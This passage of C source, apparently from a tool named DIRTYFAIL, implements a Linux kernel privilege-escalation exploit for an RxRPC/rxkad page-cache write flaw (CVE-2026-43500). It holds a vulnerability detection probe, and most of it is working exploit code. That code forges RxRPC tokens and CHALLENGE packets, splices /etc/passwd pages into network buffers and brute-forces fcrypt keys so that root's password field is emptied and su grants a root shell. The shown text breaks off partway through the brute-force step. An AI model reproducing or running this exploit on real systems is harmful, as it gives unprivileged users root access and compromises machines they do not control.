/*
 * DIRTYFAIL — dirtyfrag_rxrpc.c — Dirty Frag RxRPC variant
 *                                  CVE-2026-43500
 *
 * BACKGROUND
 * ----------
 * `rxkad_verify_packet_1()` decrypts the first 8 bytes of an RxRPC
 * data packet in-place via `pcbc(fcrypt)`. With `splice()` planting a
 * page-cache page into the skb's frag, the in-place decrypt lands an
 * 8-byte STORE on top of that page.
 *
 * The 8 STOREd bytes are `pcbc_decrypt(C, K)` where C is the existing
 * 8 bytes at the file offset and K is an attacker-controlled 8-byte
 * session key from an RxRPC v1 token registered via `add_key("rxrpc",
 * ...)`. With a single block and IV = 0, pcbc reduces to a plain
 * fcrypt_decrypt(C, K), which is a 56-bit-key cipher — small enough
 * to brute-force in user space until the desired plaintext drops out.
 *
 * Unlike xfrm-ESP (CVE-2026-43284), this path needs no namespace
 * privilege — `add_key`, `socket(AF_RXRPC)`, `socket(AF_ALG)`, and
 * `splice` are all available to unprivileged users on a stock build
 * with rxrpc.ko present (which Ubuntu ships by default).
 *
 * EXPLOIT TARGET
 * --------------
 * /etc/passwd line 1 ("root:x:0:0:..."). Three 8-byte STOREs at
 * offsets 4, 6, 8 with last-write-wins reshape chars 4..15 into
 * "::0:0:GGGGGG:" — empty password field for root. PAM
 * `pam_unix.so nullok` then accepts a missing password, su drops
 * a root shell.
 *
 *   file off:  0  1  2  3  4  5  6  7  8  9 10 11 12 13 14 15
 *   original:  r  o  o  t  :  x  :  0  :  0  :  r  o  o  t  :
 *   final:     r  o  o  t  :  :  0  :  0  :  G  G  G  G  G  :
 *
 * Splice A @ 4 (8B): bytes 4..11 = P_A    want P_A[0..1] = "::"
 * Splice B @ 6 (8B): bytes 6..13 = P_B    want P_B[0..1] = "0:"
 * Splice C @ 8 (8B): bytes 8..15 = P_C    want P_C[0..1] = "0:",
 *                                              P_C[2..6] ∉ {':' '\\0' '\\n'},
 *                                              P_C[7]    = ":"
 *
 * Chained-ciphertext correction: by the time splice B runs, the page
 * at offsets 6..11 has already been overwritten by splice A. So the
 * ciphertext fcrypt sees for K_B is `P_A[2..7] || original_C[6..7]`
 * (the last 2 bytes of the splice region are still original passwd
 * bytes 12..13). Same logic for K_C against P_B. We compute these
 * actual ciphertexts before each brute force.
 *
 * BRUTE-FORCE COST (single core, ~18 Mops/s):
 *   K_A:   2 fully-fixed bytes        ⇒ ~2^16 iters ⇒ ~3 ms
 *   K_B:   2 fully-fixed bytes        ⇒ ~2^16 iters ⇒ ~3 ms
 *   K_C:   3 fixed + 5 weak constraints ⇒ ~2^24 iters ⇒ ~1 s
 */

#include "dirtyfrag_rxrpc.h"
#include "fcrypt.h"
#include "apparmor_bypass.h"

#include <fcntl.h>
#include <pwd.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/uio.h>
#include <time.h>
#include <poll.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#ifdef __linux__
#include <sched.h>
#include <sys/syscall.h>
#include <linux/if.h>
#include <sys/ioctl.h>
#include <linux/keyctl.h>
#else
/* macOS analysis stubs only — real binary runs on Linux. */
#define IFNAMSIZ 16
#define IFF_UP        0x01
#define IFF_RUNNING   0x40
#define SIOCGIFFLAGS  0x8913
#define SIOCSIFFLAGS  0x8914
#define KEY_SPEC_PROCESS_KEYRING (-2)
#define CLONE_NEWUSER 0x10000000
#define CLONE_NEWNET  0x40000000
#define SYS_unshare   0
#define SYS_add_key   0
struct ifreq { char ifr_name[IFNAMSIZ]; short ifr_flags; };
typedef int  loff_t;
__attribute__((unused))
static inline ssize_t splice  (int a, loff_t *b, int c, loff_t *d,
                               size_t e, unsigned f) {
    (void)a;(void)b;(void)c;(void)d;(void)e;(void)f; return -1; }
__attribute__((unused))
static inline ssize_t vmsplice(int a, const struct iovec *b, unsigned long c,
                               unsigned d) {
    (void)a;(void)b;(void)c;(void)d; return -1; }
#endif

/* ---------------------------------------------------------------- *
 * RxRPC / rxkad / AF_ALG fallback constants
 *
 * <linux/rxrpc.h> may not be present on all distros. Define what we
 * need locally so DIRTYFAIL compiles on any modern Linux toolchain.
 * ---------------------------------------------------------------- */

#ifndef AF_RXRPC
#define AF_RXRPC 33
#endif
#ifndef PF_RXRPC
#define PF_RXRPC AF_RXRPC
#endif
#ifndef SOL_RXRPC
#define SOL_RXRPC 272
#endif
#ifndef RXRPC_SECURITY_KEY
#define RXRPC_SECURITY_KEY        1
#define RXRPC_MIN_SECURITY_LEVEL  4
#define RXRPC_USER_CALL_ID        1
#define RXRPC_SECURITY_AUTH       1
#endif

/* RxRPC packet header (28 bytes, network byte order on the wire). */
struct rxrpc_wire_hdr {
    uint32_t epoch;
    uint32_t cid;
    uint32_t callNumber;
    uint32_t seq;
    uint32_t serial;
    uint8_t  type;
    uint8_t  flags;
    uint8_t  userStatus;
    uint8_t  securityIndex;
    uint16_t cksum;        /* big-endian on wire */
    uint16_t serviceId;
} __attribute__((packed));

#define RXRPC_PKT_DATA       1
#define RXRPC_PKT_CHALLENGE  6
#define RXRPC_LAST_PACKET    0x04
#define RXRPC_CHANNELMASK    3
#define RXRPC_CIDSHIFT       2

struct rxkad_challenge_payload {
    uint32_t version;
    uint32_t nonce;
    uint32_t min_level;
    uint32_t __padding;
} __attribute__((packed));

/* sockaddr_rxrpc is in <linux/rxrpc.h>; fallback below.
 *
 * IMPORTANT: the kernel's struct sockaddr_rxrpc has the transport union
 * sized to include sockaddr_in6 (28 B), making the total 36 B. The
 * rxrpc_bind() syscall rejects with -EINVAL if len < sizeof(struct
 * sockaddr_rxrpc), so even when we only use the v4 path we MUST send
 * 36 bytes — hence the in6 member below. */
struct dfr_sockaddr_rxrpc {
    uint16_t srx_family;
    uint16_t srx_service;
    uint16_t transport_type;
    uint16_t transport_len;
    union {
        uint16_t           family;
        struct sockaddr_in  sin;
        struct sockaddr_in6 sin6;
    } transport;
};

/* AF_ALG IV control message header. */
struct dfr_af_alg_iv {
    uint32_t ivlen;
    uint8_t  iv[8];
} __attribute__((packed));

/* ---------------------------------------------------------------- *
 * Detection (precondition probe — unchanged from earlier version)
 * ---------------------------------------------------------------- */

df_result_t dirtyfrag_rxrpc_detect(void)
{
    log_step("Dirty Frag — RxRPC variant (CVE-2026-43500) — detection");

    int km = -1, kn = -1;
    if (kernel_version(&km, &kn))
        log_hint("kernel %d.%d.x", km, kn);

    bool rxrpc = kmod_loaded("rxrpc");
    log_hint("rxrpc currently loaded: %s", rxrpc ? "yes" : "no");

    int s = socket(AF_RXRPC, SOCK_DGRAM, 0);
    bool can_open = (s >= 0);
    if (can_open) close(s);
    log_hint("AF_RXRPC socket: %s", can_open ? "openable" : "denied");

    if (!rxrpc && !can_open) {
        log_ok("rxrpc not present and AF_RXRPC socket family rejected — "
               "RxRPC variant unreachable");
        return DF_PRECOND_FAIL;
    }

    /* The RxRPC trigger needs to register an rxrpc key + open AF_RXRPC
     * socket inside a userns with caps. If caps are stripped, fail out. */
    if (apparmor_userns_caps_blocked()) {
        log_ok("LSM-mitigated — unprivileged userns has no caps, RxRPC trigger "
               "cannot register session keys or open AF_RXRPC.");
        return DF_PRECOND_FAIL;
    }

    if (dirtyfail_active_probes) {
        log_step("--active set: firing rxkad handshake-forgery trigger against /tmp sentinel");
        df_result_t pr = dirtyfrag_rxrpc_active_probe();
        if (pr == DF_VULNERABLE || pr == DF_OK || pr == DF_PRECOND_FAIL) return pr;
        log_warn("active probe inconclusive — falling back to precondition verdict");
    }

    log_warn("VULNERABLE — RxRPC variant of Dirty Frag is reachable");
    log_warn("apply mitigation: `dirtyfail --mitigate` (blacklists rxrpc + others)");
    log_warn("or manually: blacklist rxrpc + drop_caches");
    log_hint("re-run with `--scan --active` for an empirical sentinel-STORE probe");
    return DF_VULNERABLE;
}

/* ================================================================ *
 * Exploit (Linux-only; macOS gets a stub at the bottom).
 * ================================================================ */

#ifdef __linux__

extern ssize_t splice(int fd_in, loff_t *off_in, int fd_out,
                      loff_t *off_out, size_t len, unsigned int flags);
extern ssize_t vmsplice(int fd, const struct iovec *iov, unsigned long nr,
                        unsigned int flags);

/* ---- /proc helpers --------------------------------------------------- */

static bool write_proc_str(const char *path, const char *value)
{
    int fd = open(path, O_WRONLY);
    if (fd < 0) return false;
    ssize_t want = (ssize_t)strlen(value);
    ssize_t got  = write(fd, value, want);
    close(fd);
    return got == want;
}

/* ---- userns / netns setup ------------------------------------------- */

__attribute__((unused))
static bool setup_userns(uid_t real_uid, gid_t real_gid)
{
    if (syscall(SYS_unshare, CLONE_NEWUSER | CLONE_NEWNET) < 0) {
        log_bad("unshare(USER|NET): %s", strerror(errno));
        return false;
    }
    write_proc_str("/proc/self/setgroups", "deny");
    char buf[64];
    snprintf(buf, sizeof(buf), "%u %u 1", (unsigned)real_uid, (unsigned)real_uid);
    if (!write_proc_str("/proc/self/uid_map", buf)) {
        log_bad("uid_map: %s", strerror(errno));
        return false;
    }
    snprintf(buf, sizeof(buf), "%u %u 1", (unsigned)real_gid, (unsigned)real_gid);
    if (!write_proc_str("/proc/self/gid_map", buf)) {
        log_bad("gid_map: %s", strerror(errno));
        return false;
    }
    /* Bring lo up so loopback works inside the new netns. */
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return false;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, "lo", IFNAMSIZ - 1);
    if (ioctl(s, SIOCGIFFLAGS, &ifr) == 0) {
        ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
        ioctl(s, SIOCSIFFLAGS, &ifr);
    }
    close(s);
    return true;
}

/* ---- RxRPC v1 token build ------------------------------------------- *
 *
 * The kernel parses an RxRPC v1 token as a sequence of XDR-encoded
 * fields (all big-endian uint32, strings padded to 4-byte boundaries).
 *
 *   flags         u32
 *   cell_name     XDR string
 *   ntoken        u32
 *   token[ntoken] = {
 *       len               u32   (length of the rest of the token)
 *       sec_ix            u32   (=2 for RXKAD)
 *       vice_id           u32
 *       kvno              u32
 *       session_key       u8[8]   ← THE KEY WE BRUTE-FORCED
 *       issued            u32
 *       expires           u32
 *       primary_flag      u32
 *       ticket_len        u32
 *       ticket            u8[ticket_len]
 *   }
 */

static int build_rxrpc_v1_token(uint8_t *out, size_t maxlen,
                                const uint8_t key[8])
{
    uint8_t *p = out;
    uint8_t *end = out + maxlen;

    /* Helper to bounds-check before each write. */
    #define NEED(n) do { if (p + (n) > end) { errno = E2BIG; return -1; } } while (0)

    uint32_t now = (uint32_t)time(NULL);
    uint32_t expires = now + 86400;

    NEED(4); *(uint32_t *)p = htonl(0); p += 4;       /* flags */

    const char *cell = "evil";
    uint32_t clen = (uint32_t)strlen(cell);
    uint32_t pad  = (4 - (clen & 3)) & 3;
    NEED(4 + clen + pad);
    *(uint32_t *)p = htonl(clen); p += 4;
    memcpy(p, cell, clen);
    memset(p + clen, 0, pad);
    p += clen + pad;

    NEED(4); *(uint32_t *)p = htonl(1); p += 4;       /* ntoken */

    uint8_t *toklen_slot = p;
    NEED(4); p += 4;                                  /* will fill below */
    uint8_t *tokstart = p;

    NEED(4); *(uint32_t *)p = htonl(2); p += 4;       /* sec_ix = RXKAD */
    NEED(4); *(uint32_t *)p = htonl(0); p += 4;       /* vice_id */
    NEED(4); *(uint32_t *)p = htonl(1); p += 4;       /* kvno */
    NEED(8); memcpy(p, key, 8); p += 8;               /* session_key */
    NEED(4); *(uint32_t *)p = htonl(now);     p += 4; /* issued */
    NEED(4); *(uint32_t *)p = htonl(expires); p += 4; /* expires */
    NEED(4); *(uint32_t *)p = htonl(1); p += 4;       /* primary_flag */
    NEED(4); *(uint32_t *)p = htonl(8); p += 4;       /* ticket_len */
    NEED(8); memset(p, 0xCC, 8); p += 8;              /* ticket (any bytes) */

    *(uint32_t *)toklen_slot = htonl((uint32_t)(p - tokstart));

    return (int)(p - out);
    #undef NEED
}

static long add_rxrpc_key(const char *desc, const uint8_t key[8])
{
    uint8_t buf[256];
    int n = build_rxrpc_v1_token(buf, sizeof(buf), key);
    if (n < 0) return -1;
    return syscall(SYS_add_key, "rxrpc", desc, buf, (size_t)n,
                   KEY_SPEC_PROCESS_KEYRING);
}

/* ---- AF_ALG pcbc(fcrypt) helpers ------------------------------------ *
 *
 * Used to compute the rxkad packet checksum. The kernel does:
 *
 *   csum_iv  = high 8 bytes of PCBC-encrypt({epoch, cid, 0, sec_ix},
 *                                            IV = session_key)
 *   cksum_h  = (PCBC-encrypt({call_id, x}, IV = csum_iv)[1] >> 16) | 1
 *     where x = (cid_low2 << 30) | (seq & 0x3fffffff)
 *
 * We could roll this in user space using fcrypt directly (no AF_ALG),
 * but using AF_ALG is simpler and exactly matches what the kernel does
 * — useful for catching protocol drift across kernel versions.
 */

static int alg_open_pcbc_fcrypt(const uint8_t key[8])
{
    int s = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (s < 0) return -1;
    struct sockaddr_alg_compat sa = { .salg_family = AF_ALG };
    strncpy((char *)sa.salg_type, "skcipher",     sizeof(sa.salg_type) - 1);
    strncpy((char *)sa.salg_name, "pcbc(fcrypt)", sizeof(sa.salg_name) - 1);
    if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        close(s); return -1;
    }
    if (setsockopt(s, SOL_ALG, ALG_SET_KEY, key, 8) < 0) {
        close(s); return -1;
    }
    return s;
}

static int alg_pcbc_run(int alg_s, int op, const uint8_t iv[8],
                        const void *in, size_t inlen, void *out)
{
    int op_fd = accept(alg_s, NULL, NULL);
    if (op_fd < 0) return -1;

    char cbuf[CMSG_SPACE(sizeof(int))
            + CMSG_SPACE(sizeof(struct dfr_af_alg_iv))] = {0};
    struct msghdr msg = { .msg_control = cbuf, .msg_controllen = sizeof(cbuf) };

    struct cmsghdr *c = CMSG_FIRSTHDR(&msg);
    c->cmsg_level = SOL_ALG;
    c->cmsg_type  = ALG_SET_OP;
    c->cmsg_len   = CMSG_LEN(sizeof(int));
    *(int *)CMSG_DATA(c) = op;

    c = CMSG_NXTHDR(&msg, c);
    c->cmsg_level = SOL_ALG;
    c->cmsg_type  = ALG_SET_IV;
    c->cmsg_len   = CMSG_LEN(sizeof(struct dfr_af_alg_iv));
    struct dfr_af_alg_iv *aiv = (struct dfr_af_alg_iv *)CMSG_DATA(c);
    aiv->ivlen = 8;
    memcpy(aiv->iv, iv, 8);

    struct iovec iov = { .iov_base = (void *)in, .iov_len = inlen };
    msg.msg_iov = &iov; msg.msg_iovlen = 1;

    if (sendmsg(op_fd, &msg, 0) < 0) { close(op_fd); return -1; }
    ssize_t n = read(op_fd, out, inlen);
    close(op_fd);
    return n == (ssize_t)inlen ? 0 : -1;
}

static int compute_csum_iv(uint32_t epoch, uint32_t cid, uint32_t sec_ix,
                           const uint8_t key[8], uint8_t out[8])
{
    int s = alg_open_pcbc_fcrypt(key);
    if (s < 0) return -1;
    uint32_t in[4] = { htonl(epoch), htonl(cid), 0, htonl(sec_ix) };
    uint8_t  enc[16];
    int rc = alg_pcbc_run(s, ALG_OP_ENCRYPT, key, in, 16, enc);
    close(s);
    if (rc < 0) return -1;
    memcpy(out, enc + 8, 8);
    return 0;
}

static int compute_cksum(uint32_t cid, uint32_t call_id, uint32_t seq,
                         const uint8_t key[8], const uint8_t csum_iv[8],
                         uint16_t *out_h)
{
    int s = alg_open_pcbc_fcrypt(key);
    if (s < 0) return -1;
    uint32_t x = ((cid & RXRPC_CHANNELMASK) << (32 - RXRPC_CIDSHIFT))
               | (seq & 0x3fffffff);
    uint32_t in[2]  = { htonl(call_id), htonl(x) };
    uint32_t enc[2];
    int rc = alg_pcbc_run(s, ALG_OP_ENCRYPT, csum_iv, in, 8, enc);
    close(s);
    if (rc < 0) return -1;
    uint16_t v = (uint16_t)((ntohl(enc[1]) >> 16) & 0xffff);
    if (v == 0) v = 1;
    *out_h = v;
    return 0;
}

/* ---- AF_RXRPC client ------------------------------------------------- */

static int setup_rxrpc_client(uint16_t local_port, const char *keyname)
{
    int fd = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
    if (fd < 0) {
        log_bad("socket(AF_RXRPC): %s", strerror(errno));
        return -1;
    }

    if (setsockopt(fd, SOL_RXRPC, RXRPC_SECURITY_KEY,
                   keyname, strlen(keyname)) < 0) {
        log_bad("setsockopt RXRPC_SECURITY_KEY: %s", strerror(errno));
        close(fd); return -1;
    }

    int level = RXRPC_SECURITY_AUTH;
    if (setsockopt(fd, SOL_RXRPC, RXRPC_MIN_SECURITY_LEVEL,
                   &level, sizeof(level)) < 0) {
        log_bad("setsockopt RXRPC_MIN_SECURITY_LEVEL: %s", strerror(errno));
        close(fd); return -1;
    }

    struct dfr_sockaddr_rxrpc srx;
    memset(&srx, 0, sizeof(srx));
    srx.srx_family    = AF_RXRPC;
    srx.srx_service   = 0;
    srx.transport_type= SOCK_DGRAM;
    srx.transport_len = sizeof(struct sockaddr_in);
    srx.transport.sin.sin_family      = AF_INET;
    srx.transport.sin.sin_port        = htons(local_port);
    srx.transport.sin.sin_addr.s_addr = htonl(0x7f000001);
    if (bind(fd, (struct sockaddr *)&srx, sizeof(srx)) < 0) {
        log_bad("bind AF_RXRPC :%u: %s", local_port, strerror(errno));
        close(fd); return -1;
    }
    return fd;
}

static int rxrpc_initiate_call(int fd, uint16_t srv_port,
                               uint16_t svc_id, unsigned long user_call_id)
{
    /* Wire payload — fixed 8 bytes, not C-string semantics. */
    char data[8] = { 'P','I','N','G','P','I','N','G' };
    struct dfr_sockaddr_rxrpc srx;
    memset(&srx, 0, sizeof(srx));
    srx.srx_family    = AF_RXRPC;
    srx.srx_service   = svc_id;
    srx.transport_type= SOCK_DGRAM;
    srx.transport_len = sizeof(struct sockaddr_in);
    srx.transport.sin.sin_family      = AF_INET;
    srx.transport.sin.sin_port        = htons(srv_port);
    srx.transport.sin.sin_addr.s_addr = htonl(0x7f000001);

    char cmsg_buf[CMSG_SPACE(sizeof(unsigned long))];
    struct msghdr msg = { .msg_name = &srx, .msg_namelen = sizeof(srx) };
    struct iovec iov = { .iov_base = data, .iov_len = sizeof(data) };
    msg.msg_iov = &iov; msg.msg_iovlen = 1;
    msg.msg_control = cmsg_buf; msg.msg_controllen = sizeof(cmsg_buf);
    struct cmsghdr *cm = CMSG_FIRSTHDR(&msg);
    cm->cmsg_level = SOL_RXRPC;
    cm->cmsg_type  = RXRPC_USER_CALL_ID;
    cm->cmsg_len   = CMSG_LEN(sizeof(unsigned long));
    *(unsigned long *)CMSG_DATA(cm) = user_call_id;

    int fl = fcntl(fd, F_GETFL);
    fcntl(fd, F_SETFL, fl | O_NONBLOCK);
    ssize_t n = sendmsg(fd, &msg, 0);
    fcntl(fd, F_SETFL, fl);
    if (n < 0 && errno != EAGAIN && errno != EWOULDBLOCK) return -1;
    return 0;
}

/* ---- UDP fake-server ------------------------------------------------ */

static int setup_udp_server(uint16_t port)
{
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return -1;
    struct sockaddr_in sa = {
        .sin_family = AF_INET,
        .sin_port = htons(port),
        .sin_addr.s_addr = htonl(0x7f000001),
    };
    if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        close(s); return -1;
    }
    return s;
}

static ssize_t udp_recv_to(int s, void *buf, size_t cap,
                           struct sockaddr_in *from, int timeout_ms)
{
    struct pollfd pfd = { .fd = s, .events = POLLIN };
    if (poll(&pfd, 1, timeout_ms) <= 0) return -1;
    socklen_t fl = from ? sizeof(*from) : 0;
    return recvfrom(s, buf, cap, 0,
                    (struct sockaddr *)from, from ? &fl : NULL);
}

/* ---- one trigger ---------------------------------------------------- *
 *
 * Run exactly one 8-byte STORE at file offset `splice_off` of `target_fd`,
 * using the rxkad session key `key`. Sequence:
 *
 *   1. add_key("rxrpc", "evil<n>", v1_token{session_key=key})
 *   2. udp_srv = bind 127.0.0.1:port_S
 *   3. rxsk_cli = AF_RXRPC + SECURITY_KEY=evil<n> + bind :port_C
 *   4. rxsk_cli sendmsg → triggers handshake → udp_srv receives first packet
 *   5. extract (epoch, cid, callN) from that packet
 *   6. udp_srv sends forged CHALLENGE → rxsk_cli auto-RESPONSE
 *   7. compute csum_iv, cksum with `key`
 *   8. build malicious DATA wire header
 *   9. pipe(); vmsplice(hdr); splice(target@splice_off, 8B); splice(pipe → udp_srv)
 *  10. recvmsg(rxsk_cli) drives kernel through verify_packet → in-place STORE
 */

static int g_trigger_seq = 0;

static bool do_one_trigger(int target_fd, off_t splice_off,
                           const uint8_t key[8])
{
    char keyname[32];
    snprintf(keyname, sizeof(keyname), "df-evil%d", g_trigger_seq++);

    long key_id = add_rxrpc_key(keyname, key);
    if (key_id < 0) {
        log_bad("add_rxrpc_key: %s", strerror(errno));
        return false;
    }

    /* Use varying ports so kernel TIME_WAIT / stale state doesn't bite. */
    uint16_t port_S = (uint16_t)(7777 + (g_trigger_seq * 2 % 200));
    uint16_t port_C = (uint16_t)(port_S + 1);
    uint16_t svc_id = 1234;

    int udp_srv = setup_udp_server(port_S);
    if (udp_srv < 0) { log_bad("udp server"); return false; }

    int rxsk = setup_rxrpc_client(port_C, keyname);
    if (rxsk < 0) { log_bad("rxrpc client"); close(udp_srv); return false; }

    if (rxrpc_initiate_call(rxsk, port_S, svc_id, 0xDEAD) < 0) {
        log_bad("initiate call");
        close(rxsk); close(udp_srv); return false;
    }

    /* Receive first packet from rxsk_cli — this is the kernel's
     * implicit DATA-0 (handshake init). It carries epoch + cid. */
    uint8_t pkt[2048];
    struct sockaddr_in cli_addr;
    ssize_t n = udp_recv_to(udp_srv, pkt, sizeof(pkt), &cli_addr, 1500);
    if (n < (ssize_t)sizeof(struct rxrpc_wire_hdr)) {
        log_bad("no handshake packet (n=%zd)", n);
        close(rxsk); close(udp_srv); return false;
    }
    struct rxrpc_wire_hdr *whdr = (struct rxrpc_wire_hdr *)pkt;
    uint32_t epoch  = ntohl(whdr->epoch);
    uint32_t cid    = ntohl(whdr->cid);
    uint32_t callN  = ntohl(whdr->callNumber);
    uint16_t svc_in = ntohs(whdr->serviceId);
    uint16_t cliport= ntohs(cli_addr.sin_port);

    /* Send forged CHALLENGE so the client emits RESPONSE and primes
     * conn->rxkad.cipher with our session key. */
    {
        struct {
            struct rxrpc_wire_hdr           hdr;
            struct rxkad_challenge_payload  ch;
        } __attribute__((packed)) c;
        memset(&c, 0, sizeof(c));
        c.hdr.epoch         = htonl(epoch);
        c.hdr.cid           = htonl(cid);
        c.hdr.serial        = htonl(0x10000);
        c.hdr.type          = RXRPC_PKT_CHALLENGE;
        c.hdr.securityIndex = 2;
        c.hdr.serviceId     = htons(svc_in);
        c.ch.version        = htonl(2);
        c.ch.nonce          = htonl(0xdeadbeefu);
        c.ch.min_level      = htonl(1);

        struct sockaddr_in to = {
            .sin_family = AF_INET,
            .sin_port   = htons(cliport),
            .sin_addr.s_addr = htonl(0x7f000001),
        };
        if (sendto(udp_srv, &c, sizeof(c), 0,
                   (struct sockaddr *)&to, sizeof(to)) < 0) {
            log_bad("send CHALLENGE: %s", strerror(errno));
            close(rxsk); close(udp_srv); return false;
        }
    }

    /* Drain whatever RESPONSE / further packets the client emits. */
    for (int i = 0; i < 4; i++) {
        struct sockaddr_in src;
        if (udp_recv_to(udp_srv, pkt, sizeof(pkt), &src, 500) < 0) break;
    }

    /* Compute csum_iv + wire cksum with our session key. */
    uint8_t csum_iv[8];
    if (compute_csum_iv(epoch, cid, 2, key, csum_iv) < 0) {
        log_bad("compute_csum_iv");
        close(rxsk); close(udp_srv); return false;
    }
    uint16_t cksum_h = 0;
    if (compute_cksum(cid, callN, 1, key, csum_iv, &cksum_h) < 0) {
        log_bad("compute_cksum");
        close(rxsk); close(udp_srv); return false;
    }

    /* Build malicious DATA wire header. */
    struct rxrpc_wire_hdr mal;
    memset(&mal, 0, sizeof(mal));
    mal.epoch         = htonl(epoch);
    mal.cid           = htonl(cid);
    mal.callNumber    = htonl(callN);
    mal.seq           = htonl(1);
    mal.serial        = htonl(0x42000);
    mal.type          = RXRPC_PKT_DATA;
    mal.flags         = RXRPC_LAST_PACKET;
    mal.securityIndex = 2;
    mal.cksum         = htons(cksum_h);
    mal.serviceId     = htons(svc_in);

    /* connect udp_srv → client port so we can splice. */
    struct sockaddr_in dst = {
        .sin_family = AF_INET,
        .sin_port   = htons(cliport),
        .sin_addr.s_addr = htonl(0x7f000001),
    };
    if (connect(udp_srv, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
        log_bad("connect udp_srv: %s", strerror(errno));
        close(rxsk); close(udp_srv); return false;
    }

    /* The actual splice trigger: pipe < hdr ; pipe < file@off,8 ; udp < pipe */
    int p[2];
    if (pipe(p) < 0) { close(rxsk); close(udp_srv); return false; }
    {
        struct iovec v = { .iov_base = &mal, .iov_len = sizeof(mal) };
        if (vmsplice(p[1], &v, 1, 0) != (ssize_t)sizeof(mal)) {
            log_bad("vmsplice: %s", strerror(errno));
            close(p[0]); close(p[1]);
            close(rxsk); close(udp_srv); return false;
        }
    }
    {
        loff_t off = splice_off;
        if (splice(target_fd, &off, p[1], NULL, 8, 0) != 8) {
            log_bad("splice file->pipe: %s", strerror(errno));
            close(p[0]); close(p[1]);
            close(rxsk); close(udp_srv); return false;
        }
    }
    if (splice(p[0], NULL, udp_srv, NULL, sizeof(mal) + 8, 0)
            != (ssize_t)(sizeof(mal) + 8)) {
        log_bad("splice pipe->udp: %s", strerror(errno));
        close(p[0]); close(p[1]);
        close(rxsk); close(udp_srv); return false;
    }
    close(p[0]); close(p[1]);

    /* recvmsg drives the kernel through verify_packet and fires the
     * in-place STORE. We don't care about the actual data. */
    int fl = fcntl(rxsk, F_GETFL);
    fcntl(rxsk, F_SETFL, fl | O_NONBLOCK);
    char rb[2048];
    struct dfr_sockaddr_rxrpc rsrx;
    char ccb[256];
    for (int round = 0; round < 5; round++) {
        struct msghdr m = { .msg_name = &rsrx, .msg_namelen = sizeof(rsrx) };
        struct iovec iv = { .iov_base = rb, .iov_len = sizeof(rb) };
        m.msg_iov = &iv; m.msg_iovlen = 1;
        m.msg_control = ccb; m.msg_controllen = sizeof(ccb);
        ssize_t r = recvmsg(rxsk, &m, 0);
        if (r > 0) break;
        if (errno == EAGAIN || errno == EWOULDBLOCK) usleep(20000);
        else break;
    }
    fcntl(rxsk, F_SETFL, fl);

    close(rxsk);
    close(udp_srv);
    return true;
}

/* ---- predicates ----------------------------------------------------- */

static bool predicate_pa_nullok(const uint8_t P[8])
{
    /* Want chars 4..5 of /etc/passwd to become "::" — empty pwd field. */
    return P[0] == ':' && P[1] == ':';
}

static bool predicate_pb_nullok(const uint8_t P[8])
{
    /* Want chars 6..7 = "0:" (uid=0 with separator). */
    return P[0] == '0' && P[1] == ':';
}

static bool predicate_pc_nullok(const uint8_t P[8])
{
    /* Want chars 8..15 = "0:GGGGG:". G ∉ {':' '\0' '\n'}. */
    if (P[0] != '0' || P[1] != ':' || P[7] != ':') return false;
    for (int i = 2; i < 7; i++)
        if (P[i] == ':' || P[i] == '\0' || P[i] == '\n') return false;
    return true;
}

/* ---- main exploit --------------------------------------------------- */

#define MAX_BRUTE_ITERS_AB  (1ULL << 24)   /* ~3 ms expected hit, headroom */
#define MAX_BRUTE_ITERS_C   (1ULL << 30)   /* ~1 s expected hit, more headroom */

df_result_t dirtyfrag_rxrpc_exploit(bool do_shell)
{
    log_step("Dirty Frag (RxRPC) — exploit");

    if (real_uid_for_target() == 0) {
        log_warn("already root in init namespace — nothing to escalate");
        return DF_OK;
    }

    /* Initialize fcrypt and verify the cipher works. */
    fcrypt_init();
    if (!fcrypt_selftest()) {
        log_bad("fcrypt selftest FAILED — wrong S-boxes or key schedule");
        return DF_TEST_ERROR;
    }
    log_ok("fcrypt selftest OK");

    /* The RxRPC variant targets line 1 of /etc/passwd unconditionally
     * (it makes root's password empty for PAM nullok). We need the
     * 16 bytes at offsets 4..15 of that file to do the brute force. */
    int pfd = open("/etc/passwd", O_RDONLY);
    if (pfd < 0) { log_bad("open /etc/passwd: %s", strerror(errno)); return DF_TEST_ERROR; }

    /* Read the page and the original ciphertexts at offsets 4, 6, 8. */
    uint8_t Cline[16];
    if (pread(pfd, Cline, 16, 0) != 16) {
        log_bad("pread /etc/passwd: %s", strerror(errno));
        close(pfd); return DF_TEST_ERROR;
    }
    log_step("/etc/passwd[0..15] = '%.16s'", (char *)Cline);

    uint8_t Ca[8], Cb[8], Cc[8];
    memcpy(Ca, Cline + 4, 8);
    memcpy(Cb, Cline + 6, 8);
    memcpy(Cc, Cline + 8, 8);

    log_warn("about to:");
    log_warn("  1. brute-force three rxkad session keys (~1 second total)");
    log_warn("  2. enter a fresh user/net namespace");
    log_warn("  3. fire 3 splice triggers against /etc/passwd page cache");
    log_warn("  4. PAM `pam_unix nullok` will accept empty password for root");
    log_warn("cleanup: dirtyfail --cleanup, or `echo 3 > /proc/sys/vm/drop_caches`");
    if (!typed_confirm("DIRTYFAIL")) {
        log_bad("confirmation declined — aborting");
        close(pfd); return DF_OK;
    }

    /* === Brute force K_A ============================================= */
    uint8_t Ka[8], Pa[8];
    if (!fcrypt_brute_force(Ca, predicate_pa_nullok, MAX_BRUTE_ITERS_AB,
                            (uint64_t)time(NULL) ^ 0xA1ULL,
                            "K_A (chars 4..5 = \"::\")", Ka, Pa)) {
        log_bad("K_A brute force exhausted");
        close(pfd); return DF_EXPLOIT_FAIL;
    }

    /* === Chained-ciphertext correction for K_B ====================== *
     *
     * After splice A overwrites bytes 4..11 with P_A, splice B at offset 6
     * (length 8) sees: bytes 6..11 = P_A[2..7], bytes 12..13 = original.
     */
    uint8_t Cb_actual[8];
    memcpy(Cb_actual,     Pa + 2, 6);
    memcpy(Cb_actual + 6, Cb + 6, 2);

    /* === Brute force K_B ============================================= */
    uint8_t Kb[8], Pb[8];
